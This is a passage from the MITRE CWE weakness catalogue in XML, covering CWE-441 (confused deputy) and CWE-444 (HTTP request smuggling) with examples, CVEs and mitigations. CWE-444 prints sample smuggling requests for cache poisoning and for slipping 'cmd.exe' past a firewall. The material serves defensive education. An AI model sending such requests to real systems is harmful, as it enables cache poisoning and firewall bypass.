               <Modification_Comment>updated Alternate_Terms, Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Name, Other_Notes, Potential_Mitigations, References, Related_Attack_Patterns, Relationship_Notes, Relationships, Type, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated References, Relationship_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Affected_Resources, Applicable_Platforms, Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships, Weakness_Ordinalities</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated References, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Relationship_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Research_Gaps</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Alternate_Terms, Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2010-02-16">Unrestricted File Upload</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="441" Name="Unintended Proxy or Intermediary ('Confused Deputy')" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product receives a request, message, or directive from an upstream component, but the product does not sufficiently preserve the original source of the request before forwarding the request to an external actor that is outside of the product's control sphere. This causes the product to appear to be the source of the request, leading it to act as a proxy or other intermediary between the upstream component and the external actor.</Description>
         <Extended_Description>
            <xhtml:p>If an attacker cannot directly contact a target, but the product has access to the target, then the attacker can send a request to the product and have it be forwarded to the target. The request would appear to be coming from the product's system, not the attacker's system. As a result, the attacker can bypass access controls (such as firewalls) or hide the source of malicious requests, since the requests would not be coming directly from the attacker.</xhtml:p>
            <xhtml:p>Since proxy functionality and message-forwarding often serve a legitimate purpose, this issue only becomes a vulnerability when:</xhtml:p>
               <xhtml:ul>
                  <xhtml:li>The product runs with different privileges or on a different system, or otherwise has different levels of access than the upstream component;</xhtml:li>
                  <xhtml:li>The attacker is prevented from making the request directly to the target; and</xhtml:li>
                  <xhtml:li>The attacker can create a request that the proxy does not explicitly intend to be forwarded on the behalf of the requester. Such a request might point to an unexpected hostname, port number, hardware IP, or service. Or, the request might be sent to an allowed service, but the request could contain disallowed directives, commands, or resources.</xhtml:li>
               </xhtml:ul>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="610" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="668" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
			<Operating_System Class="Not OS-Specific" Prevalence="Undetermined"/>
			<Architecture Class="Not Architecture-Specific" Prevalence="Undetermined"/>
			<Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Confused Deputy</Term>
               <Description>This weakness is sometimes referred to as the "Confused deputy" problem, in which an attacker misused the authority of one victim (the "confused deputy") when targeting another victim.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Non-Repudiation</Scope>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Hide Activities</Impact>
               <Impact>Execute Unauthorized Code or Commands</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Enforce the use of strong mutual authentication mechanism between the two parties.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Whenever a product is an intermediary or proxy for
                   transactions between two other components, the proxy core
                   should not drop the identity of the initiator of the
                   transaction. The immutability of the identity of the
                   initiator must be maintained and should be forwarded all the
                   way to the target. </Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
             <Demonstrative_Example>
                 <Intro_Text>
                     A SoC contains a microcontroller (running ring-3
                     (least trusted ring) code), a Memory Mapped Input Output
                     (MMIO) mapped IP core (containing design-house secrets),
                     and a Direct Memory Access (DMA) controller, among several
                     other compute elements and peripherals. The SoC implements
                     access control to protect the registers in the IP core
                     (which registers store the design-house secrets) from
                     malicious, ring-3 (least trusted ring) code executing on
                     the microcontroller.  The DMA controller, however, is not
                     blocked off from accessing the IP core for functional
                     reasons.
                 </Intro_Text>
                 <Example_Code Nature="Bad" Language="Other">
                     The code in ring-3 (least trusted ring) of the
                     microcontroller attempts to directly read the protected
                     registers in IP core through MMIO transactions. However,
                     this attempt is blocked due to the implemented access
                     control. Now, the microcontroller configures the DMA core
                     to transfer data from the protected registers to a memory
                     region that it has access to. The DMA core, which is
                     acting as an intermediary in this transaction, does not
                     preserve the identity of the microcontroller and, instead,
                     initiates a new transaction with its own identity. Since
                     the DMA core has access, the transaction (and hence, the
                     attack) is successful.
                 </Example_Code>
                 <Body_Text>The weakness here is that the intermediary or the
                     proxy agent did not ensure the immutability of the
                     identity of the microcontroller initiating the
                     transaction. 
                 </Body_Text>
                 <Example_Code Nature="Good" Language="Other">The DMA
                     core forwards this transaction with the identity of the
                     code executing on the microcontroller, which is the
                     original initiator of the end-to-end transaction. Now the
                     transaction is blocked, as a result of forwarding the
                     identity of the true initiator which lacks the permission
                     to access the confidential MMIO mapped IP core.
                 </Example_Code>
             </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-1999-0017</Reference>
               <Description>FTP bounce attack. The design of the protocol allows an attacker to modify the PORT command to cause the FTP server to connect to other machines besides the attacker's.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-1999-0017</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-1999-0168</Reference>
               <Description>RPC portmapper could redirect service requests from an attacker to another entity, which thinks the requests came from the portmapper.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-1999-0168</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0315</Reference>
               <Description>FTP server does not ensure that the IP address in a PORT command is the same as the FTP user's session, allowing port scanning by proxy.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0315</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1484</Reference>
               <Description>Web server allows attackers to request a URL from another server, including other ports, which allows proxied scanning.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1484</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-2061</Reference>
               <Description>CGI script accepts and retrieves incoming URLs.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-2061</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1484</Reference>
               <Description>Bounce attack allows access to TFTP from trusted side.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1484</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-1637</Reference>
               <Description>Web-based mail program allows internal network scanning using a modified POP3 port number.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-1637</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0037</Reference>
               <Description>URL-downloading library automatically follows redirects to file:// and scp:// URLs</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0037</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Unintended proxy/intermediary</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Proxied Trusted Channel</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>32</Entry_ID>
               <Entry_Name>Routing Detour</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="219"/>
            <Related_Attack_Pattern CAPEC_ID="465"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-432"/>
            <Reference External_Reference_ID="REF-1125"/>
         </References>
         <Notes>
            <Note Type="Relationship">This weakness has a chaining relationship with CWE-668 (Exposure of Resource to Wrong Sphere) because the proxy effectively provides the attacker with access to the target's resources that the attacker cannot directly obtain.</Note>
            <Note Type="Maintenance">This could possibly be considered as an emergent resource.</Note>
            <Note Type="Theoretical">It could be argued that the "confused deputy" is a fundamental aspect of most vulnerabilities that require an active attacker. Even for common implementation issues such as buffer overflows, SQL injection, OS command injection, and path traversal, the vulnerable program already has the authorization to run code or access files. The vulnerability arises when the attacker causes the program to run unexpected code or access unexpected files.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Observed_Example, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Maintenance_Notes, Relationships, Taxonomy_Mappings, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Applicable_Platforms, Description, Maintenance_Notes, Name, Observed_Examples, References, Relationship_Notes, Relationships, Theoretical_Notes, Type</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2020-08-14</Modification_Date>
               <Modification_Comment>Per Intel Corporation suggestion, added language to be inclusive to hardware: updated Demonstrative_Examples, Description, Extended_Description, Applicable_Platforms, Potential_Mitigation, Common_Consequences, References</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Description, Potential_Mitigations, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
            <Contribution Type="Content">
               <Contribution_Name>Arun Kanuparthi, Hareesh Khattri, Parbati K. Manna</Contribution_Name>
               <Contribution_Organization>Intel Corporation</Contribution_Organization>
               <Contribution_Date>2020-08-14</Contribution_Date>
               <Contribution_Comment>Provided demonstrative example</Contribution_Comment>
            </Contribution>
            <Previous_Entry_Name Date="2013-02-21">Unintended Proxy/Intermediary</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="444" Name="Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The product acts as an intermediary HTTP agent
         (such as a proxy or firewall) in the data flow between two
         entities such as a client and server, but it does not
         interpret malformed HTTP requests or responses in ways that
         are consistent with how the messages will be processed by
         those entities that are at the ultimate destination.</Description>
         <Extended_Description>
	   <xhtml:p>HTTP requests or responses ("messages") can be
	   malformed or unexpected in ways that cause web servers or
	   clients to interpret the messages in different ways than
	   intermediary HTTP agents such as load balancers, reverse
	   proxies, web caching proxies, application firewalls,
	   etc. For example, an adversary may be able to add duplicate
	   or different header fields that a client or server might
	   interpret as one set of messages, whereas the intermediary
	   might interpret the same sequence of bytes as a different
	   set of messages. For example, discrepancies can arise in
	   how to handle duplicate headers like two Transfer-encoding
	   (TE) or two Content-length (CL), or the malicious HTTP
	   message will have different headers for TE and
	   CL.</xhtml:p>
	   <xhtml:p>The inconsistent parsing and interpretation of messages
	   can allow the adversary to "smuggle" a message to the
	   client/server without the intermediary being aware of it.</xhtml:p>
	   <xhtml:p>This weakness is usually the result of the usage
	   of outdated or incompatible HTTP protocol versions in the
	   HTTP agents.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="436" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="436" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="Web Based" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>HTTP Request Smuggling</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>HTTP Response Smuggling</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>HTTP Smuggling</Term>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Non-Repudiation</Scope>
               <Scope>Access Control</Scope>
               <Impact>Unexpected State</Impact>
               <Impact>Hide Activities</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>An attacker could create HTTP messages to exploit a number of weaknesses including 1) the message can trick the web server to associate a URL with another URL's webpage and caching the contents of the webpage (web cache poisoning attack), 2) the message can be structured to bypass the firewall protection mechanisms and gain unauthorized access to a web application, and 3) the message can invoke a script or a page that returns client credentials (similar to a Cross Site Scripting attack).</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Use a web server that employs a strict HTTP parsing procedure, such as Apache [REF-433].</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Use only SSL communication.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Terminate the client session after each request.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>System Configuration</Phase>
               <Description>Turn all pages to non-cacheable.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>In the following example, a malformed HTTP request is sent to a website that includes a proxy server and a web server with the intent of poisoning the cache to associate one webpage with another malicious webpage.</Intro_Text>
               <Example_Code Nature="Attack">
                  POST http://www.website.com/foobar.html HTTP/1.1<xhtml:br/>
		 Host: www.website.com<xhtml:br/>
		 Connection: Keep-Alive<xhtml:br/>
		 Content-Type: application/x-www-form-urlencoded<xhtml:br/>
		 Content-Length: 0<xhtml:br/>
		 Content-Length: 54<xhtml:br/>
		 <xhtml:br/>
                 GET /poison.html HTTP/1.1<xhtml:br/>
		 Host: www.website.com<xhtml:br/>
		 Bla: GET http://www.website.com/page_to_poison.html HTTP/1.1<xhtml:br/>
		 Host: www.website.com<xhtml:br/>
		 Connection: Keep-Alive<xhtml:br/>
               </Example_Code>
               <Body_Text>When this request is sent to the proxy server, the proxy server parses the first four lines of the POST request and encounters the two "Content-Length" headers. The proxy server ignores the first header, so it assumes the request has a body of length 54 bytes. Therefore, it treats the data in the next three lines that contain exactly 54 bytes as the first request's body:</Body_Text>
	       <Example_Code Nature="Result">
		GET /poison.html HTTP/1.1<xhtml:br/>
		Host: www.website.com<xhtml:br/>
		Bla:<xhtml:br/>
	       </Example_Code>
	       <Body_Text>The proxy then parses the remaining bytes, which it treats as the client's second request:</Body_Text>
	       <Example_Code Nature="Attack">
		GET http://www.website.com/page_to_poison.html HTTP/1.1<xhtml:br/>
		Host: www.website.com<xhtml:br/>
		Connection: Keep-Alive<xhtml:br/>
	       </Example_Code>
               <Body_Text>The original request is forwarded by the proxy server to the web server. Unlike the proxy, the web server uses the first "Content-Length" header and considers that the first POST request has no body.</Body_Text>
	       <Example_Code Nature="Attack">
		POST http://www.website.com/foobar.html HTTP/1.1<xhtml:br/>
		Host: www.website.com<xhtml:br/>
		Connection: Keep-Alive<xhtml:br/>
		Content-Type: application/x-www-form-urlencoded<xhtml:br/>
		Content-Length: 0<xhtml:br/>
		<xhtml:i>Content-Length: 54 (ignored by server)</xhtml:i><xhtml:br/>
	       </Example_Code>
	       <Body_Text>Because the web server has assumed the original POST request was length 0, it parses the second request that follows, i.e. for GET /poison.html:</Body_Text>
	       <Example_Code Nature="Attack">
		GET /poison.html HTTP/1.1<xhtml:br/>
		Host: www.website.com<xhtml:br/>
		Bla: GET http://www.website.com/page_to_poison.html HTTP/1.1<xhtml:br/>
		Host: www.website.com<xhtml:br/>
		Connection: Keep-Alive<xhtml:br/>
	       </Example_Code>
	       <Body_Text>Note that the "Bla:" header is treated as a regular header, so it is not parsed as a separate GET request.</Body_Text>
               <Body_Text>The requests the web server sees are "POST /foobar.html" and "GET /poison.html", so it sends back two responses with the contents of the "foobar.html" page and the "poison.html" page, respectively. The proxy matches these responses to the two requests it thinks were sent by the client - "POST /foobar.html" and "GET /page_to_poison.html". If the response is cacheable, the proxy caches the contents of "poison.html" under the URL "page_to_poison.html", and the cache is poisoned! Any client requesting "page_to_poison.html" from the proxy would receive the "poison.html" page.</Body_Text>
               <Body_Text>When a website includes both a proxy server and a web server, some protection against this type of attack can be achieved by installing a web application firewall, or using a web server that includes a stricter HTTP parsing procedure or make all webpages non-cacheable.</Body_Text>
               <Body_Text>Additionally, if a web application includes a Java servlet for processing requests, the servlet can check for multiple "Content-Length" headers and if they are found the servlet can return an error response thereby preventing the poison page to be cached, as shown below.</Body_Text>
               <Example_Code Nature="Good" Language="Java">
                  <xhtml:div>protected void processRequest(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
				  <xhtml:div style="margin-left:1em;">
                    <xhtml:div>
                      <xhtml:br/>
                      <xhtml:i>// Set up response writer object</xhtml:i>
                      <xhtml:br/>...<xhtml:br/>try {
					  <xhtml:div style="margin-left:1em;">
						<xhtml:div>
                          <xhtml:i>// check for multiple content length headers</xhtml:i>
                          <xhtml:br/>Enumeration contentLengthHeaders = request.getHeaders("Content-Length");
						  <xhtml:br/>int count = 0;
						  <xhtml:br/>while (contentLengthHeaders.hasMoreElements()) {
						  <xhtml:div style="margin-left:1em;">count++;
						  </xhtml:div>}
						  <xhtml:br/>if (count &gt; 1) {
						  <xhtml:div style="margin-left:1em;">
							<xhtml:i>// output error response</xhtml:i>
							</xhtml:div>}
							<xhtml:br/>else {
							<xhtml:div style="margin-left:1em;">
							  <xhtml:div>
								<xhtml:i>// process request</xhtml:i>
							  </xhtml:div>
							  </xhtml:div>}
							  <xhtml:br/>
                        </xhtml:div>
                    </xhtml:div>} catch (Exception ex) {...}</xhtml:div>
					</xhtml:div>}
				  </xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>In the following example, a malformed HTTP request is sent to a website that includes a web server with a firewall with the intent of bypassing the web server firewall to smuggle malicious code into the system.</Intro_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>POST /page.asp HTTP/1.1<xhtml:br/>Host: www.website.com<xhtml:br/>Connection: Keep-Alive<xhtml:br/>Content-Length: 49223<xhtml:br/>
                     <xhtml:br/>zzz...zzz ["z" x 49152]<xhtml:br/>POST /page.asp HTTP/1.0<xhtml:br/>Connection: Keep-Alive<xhtml:br/>Content-Length: 30<xhtml:br/>
                     <xhtml:br/>POST /page.asp HTTP/1.0<xhtml:br/>Bla: POST /page.asp?cmd.exe HTTP/1.0<xhtml:br/>Connection: Keep-Alive</xhtml:div>
               </Example_Code>
               <Body_Text>When this request is sent to the web server, the first POST request has a content-length of 49,223 bytes, and the firewall treats the line with 49,152 copies of "z" and the lines with an additional lines with 71 bytes as its body (49,152+71=49,223). The firewall then continues to parse what it thinks is the second request starting with the line with the third POST request.</Body_Text>
               <Body_Text>Note that there is no CRLF after the "Bla: " header so the POST in the line is parsed as the value of the "Bla:" header. Although the line contains the pattern identified with a worm ("cmd.exe"), it is not blocked, since it is considered part of a header value. Therefore, "cmd.exe" is smuggled through the firewall.</Body_Text>
               <Body_Text>When the request is passed through the firewall the web server the first request is ignored because the web server does not find an expected "Content-Type: application/x-www-form-urlencoded" header, and starts parsing the second request.</Body_Text>
               <Body_Text>This second request has a content-length of 30 bytes, which is exactly the length of the next two lines up to the space after the "Bla:" header. And unlike the firewall, the web server processes the final POST as a separate third request and the "cmd.exe" worm is smuggled through the firewall to the web server.</Body_Text>
